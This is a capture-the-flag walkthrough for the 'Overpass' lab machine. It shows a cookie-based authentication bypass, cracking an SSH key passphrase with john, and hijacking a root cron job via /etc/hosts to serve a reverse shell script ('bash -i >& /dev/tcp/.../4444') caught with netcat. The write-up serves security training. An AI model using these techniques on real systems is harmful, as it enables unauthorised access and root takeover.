# Overpass

**Target IP:** `10.10.17.200` <br>
From `nmap` results we have to open ports:<br>
```nmap
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```
Let's look at the http server.
![http server](https://i.ibb.co/1vqCb4N/2.png)
![The dwnloads page](https://i.ibb.co/L5QhMYp/3.png)
I downloaded the executable for linux and the scripts that apparently are going to help us.
I tried to execute the file.
![Executing the file](https://i.ibb.co/wMD2b9z/4.png)
Let's get into the source code and understand what is going on there. Open script `overpass.go`
We have function **saveCredsToFile** there. And we can see the it takes few arguments there one of which is **filepath**.
In the line 181 we can see that the script uses the function. `saveCredsToFile(credsPath, passlist)` and it uses **credsPath** as filepath.
In the line 140 we can find the credsPath variable. `credsPath, err := homedir.Expand("~/.overpass")`.<br>
So now we know that the encrypted passwords are saved in our home directory.
Here is what we get when we are trying to read the **.overpass** file. 
![.overpass](https://i.ibb.co/0Qd2332/5.png)
It looks like **rot47** encryption. Let's go to **cyberchef** and try to decrypt it.<br>
![Cyberchef](https://i.ibb.co/b2XG0xb/6.png)
So now we know how the script works and where it keeps the passwords.

Also we got interesting comment in the line 91. The comment tells us a name. **steve**. It can be one of the developers and we can try to bruteforce into his ssh. But even if they use this unsecure password manager, probably, we cannot just gues the password. So, let's think about some other way.

Also, **gobuster** found admin page there. But we need credentials to log in there.
Let's look how the authentication form works.
I found this function there:
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
It looks like it makes a request to some api and depends on response it allows or disallows into the admin.
If we take the hint for the first task we can see that this is going to be owasp10 vulnerability and there is no bruteforcing. We can suppose that the vulnerability here is broken authentication and we might be able to bypass the authentication check by just setting the SessionToken cookie to anything.
We can run this code in the browser console to exploit the vulnerability.<br>
`Cookies.set("SessionToken", "")`
Refresh the page and now we are here:
![admin page](https://i.ibb.co/LkNrg6j/7.png)<br>
It looks like there is a private key for james. So let's copy it and try to ssh with it.
The private key works but it wants a passphrase for it. We can crack it with ssh2john and john.<br>
`ssh2john p_id > hash.txt`<br>
`john hash.txt`<br>
The password is **james13**. <br>
Let's ssh into james account.
And now we got the first flag.
![todo.txt](https://i.ibb.co/HtQmk7Q/8.png)<br>
We got these notes there that can give us some more information.<br>
We already know about the **.overpass** file so let's read it.<br>
Here is what we got from there.
![cyberchef](https://i.ibb.co/SmRxDVg/9.png) <br>
`[{"name":"System","pass":"saydrawnlyingpicture"}]`<br>
we can also read **/etc/crontab**<br>
```crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
We can see that it always trying to download **buildscript.sh** from **overpass.thm/downloads/src/**. <br>
God is being glorius today and we can change the **/etc/hosts/** file. So we need to and there the following line:
`<our ip> overpass.thm`. It is going to create a link to our ip instead of the ip that it is supposed to.
In our machine we have to create the environment for this.<br>
`mkdir -m downloads/src/`<br>
Then in the src folder we have to create our file **buildscript.sh** and put there our reverse shell.<br>
`echo "bash -i >& /dev/tcp/10.2.38.40/4444 0>&1" > downloads/src/buildscript.sh`<br>
Now we have to run **nc** to listen to the port that we specified in the reverse shell.<br>
`nc -lvnp 4444`<br>
And finally in the other terminal session we need to start simple python server<br>
`python3 -m http.server 80` **Remember, we need to run it in the parent folder of folder downloads that we created before.**
After few seconds we got the reverse shell to the root user in our nc terminal session.<br>
And now we got the root flag.